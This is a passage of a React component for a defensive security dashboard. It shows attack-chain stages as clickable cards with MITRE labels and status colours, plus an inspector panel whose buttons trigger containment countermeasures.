            const isSelected = selectedNodeIndex === i;

            return (
              <div key={st.index} className="flex-1 flex items-center">
                {/* Stage Node Box */}
                <div
                  onClick={() => setSelectedNodeIndex(i)}
                  className={`w-full rounded-xl border p-3 flex flex-col justify-between cursor-pointer transition-all duration-200 relative group ${
                    isSelected
                      ? isSafe
                        ? 'ring-2 ring-emerald-400 shadow-lg shadow-emerald-950/60 scale-[1.02]'
                        : isUnderAttack
                        ? 'ring-2 ring-red-500/90 shadow-lg shadow-red-950/70 scale-[1.02]'
                        : 'ring-2 ring-cyan-400 shadow-lg shadow-cyan-950/60 scale-[1.02]'
                      : 'hover:border-slate-500/80 hover:bg-surface-800/60'
                  } ${
                    isSafe
                      ? 'bg-emerald-950/20 border-emerald-800/50 text-slate-300'
                      : isUnderAttack
                      ? 'bg-red-950/20 border-red-800/50 text-red-200'
                      : 'bg-surface-900/90 border-surface-700/80 text-slate-300 hover:border-cyan-500/40'
                  }`}
                >
                  {/* Top Header */}
                  <div>
                    <div className="flex items-center justify-between mb-1.5">
                      <div className="flex items-center gap-1.5">
                        <span className="font-mono text-[10px] font-bold text-slate-500">
                          {st.stageNumber}
                        </span>
                        <span className="text-xs font-semibold text-slate-200 font-mono tracking-tight">
                          {st.name}
                        </span>
                      </div>
                      <span
                        className={`text-[9px] font-mono px-1.5 py-0.5 rounded border uppercase font-semibold ${getStatusBadge(
                          st.status
                        )}`}
                      >
                        {st.statusLabel}
                      </span>
                    </div>

                    <p className="font-mono text-xs font-bold text-slate-100 truncate mt-1">
                      {st.title}
                    </p>
                    <p className="text-[11px] text-slate-400 truncate mt-0.5">
                      {st.subtitle}
                    </p>
                  </div>

                  {/* 
                    Bottom Countermeasure Trigger Button:
                    - CYAN when safe / no attack
                    - GREEN when attack is taken down (30s cooldown)
                    - RED when attack is happening
                  */}
                  <div className="mt-3 pt-2 border-t border-surface-800/60">
                    {st.actionLabel ? (
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleContainment(st.actionType, st.target, st.actionLabel);
                        }}
                        disabled={state[st.actionType] || isSafe || executingAction === st.actionType}
                        className={`w-full py-1.5 px-2 rounded text-[10px] font-mono font-semibold flex items-center justify-center gap-1.5 transition-all ${
                          isSafe || state[st.actionType]
                            ? 'bg-emerald-950/80 text-emerald-300 border border-emerald-500/60 shadow-sm shadow-emerald-950/40 cursor-default'
                            : isUnderAttack
                            ? 'bg-red-950/90 hover:bg-red-900 text-red-200 border border-red-700/80 hover:shadow-sm shadow-md shadow-red-950/60 animate-pulse'
                            : 'bg-cyan-950/70 hover:bg-cyan-900/80 text-cyan-300 border border-cyan-500/50 shadow-sm shadow-cyan-950/40'
                        }`}
                      >
                        {isSafe || state[st.actionType] ? (
                          <CheckCircle2 className="w-3 h-3 text-emerald-400 shrink-0" />
                        ) : isUnderAttack ? (
                          <Zap className="w-2.5 h-2.5 text-red-400 shrink-0" />
                        ) : (
                          <Shield className="w-2.5 h-2.5 text-cyan-400 shrink-0" />
                        )}
                        <span className="truncate">{st.actionLabel}</span>
                      </button>
                    ) : (
                      <div className="text-[10px] font-mono text-slate-500 text-center py-1 truncate">
                        {st.mitre}
                      </div>
                    )}
                  </div>
                </div>

                {/* Connecting Arrow between nodes */}
                {i < stages.length - 1 && (
                  <div className="px-1.5 flex flex-col items-center justify-center text-slate-600 shrink-0">
                    <ArrowRight
                      className={`w-3.5 h-3.5 transition-colors ${
                        isSafe
                          ? 'text-emerald-400'
                          : isUnderAttack
                          ? 'text-red-400 animate-pulse'
                          : 'text-cyan-500/60'
                      }`}
                    />
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>

      {/* ── Interactive Stage Forensic Inspector ─────────────────────── */}
      <div className="mt-3 p-3.5 bg-surface-900/80 rounded-xl border border-surface-700/60 flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
        <div className="flex items-start gap-3">
          <div
            className={`p-2 rounded-lg border shrink-0 mt-0.5 transition-colors ${
              isSafe
                ? 'bg-emerald-950/40 border-emerald-800/40 text-emerald-400'
                : 'bg-surface-800 border-surface-700 text-cyan-400'
            }`}
          >
            {isSafe ? <ShieldCheck className="w-4 h-4" /> : <Info className="w-4 h-4" />}
          </div>
          <div>
            <div className="flex items-center gap-2 flex-wrap">
              <span className={`text-xs font-mono font-bold uppercase ${isSafe ? 'text-emerald-400' : 'text-cyan-400'}`}>
                STAGE {activeNode.stageNumber} INSPECTOR · {activeNode.name}
              </span>
              <span className="text-[10px] font-mono px-2 py-0.2 rounded bg-surface-800 border border-surface-700 text-slate-300">
                MITRE {activeNode.mitre}
              </span>
              <span className="text-[10px] font-mono text-slate-500">
                Tactic: {activeNode.tactic}
              </span>
              {isSafe && (
                <span className="text-[10px] font-mono px-2 py-0.2 rounded bg-emerald-950/80 border border-emerald-500/50 text-emerald-300">
                  STATUS: SECURE
                </span>
              )}
            </div>
            <p className="text-xs text-slate-300 mt-1 font-sans">
              {activeNode.detail}
            </p>
          </div>
        </div>

        {/* 
          Bottom Inspector Action Button:
          - GREEN when safe state / countermeasure enforced
          - RED when attack is happening / active countermeasure required
        */}
        {activeNode.actionLabel && (
          <button
            onClick={() => {
              if (!isSafe && !state[activeNode.actionType]) {
                handleContainment(activeNode.actionType, activeNode.target, activeNode.actionLabel);
              }
            }}
            disabled={executingAction === activeNode.actionType}
            className={`shrink-0 px-4 py-2 text-xs font-mono font-bold rounded-lg flex items-center gap-1.5 transition-all shadow-md ${
              isSafe || state[activeNode.actionType]
                ? 'bg-emerald-700 hover:bg-emerald-600 text-white border border-emerald-500 shadow-emerald-950/60 cursor-default'
                : 'bg-red-700 hover:bg-red-600 text-white border border-red-600 shadow-red-950/60 animate-pulse'
            }`}
          >
            {isSafe || state[activeNode.actionType] ? (
              <>
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-200" />
                <span>Countermeasure Enforced · Safe State</span>
              </>
            ) : (
              <>
                <Zap className="w-3.5 h-3.5" />
                <span>Enforce Countermeasure Now</span>
              </>
            )}
          </button>
        )}
      </div>
    </div>
  );
}
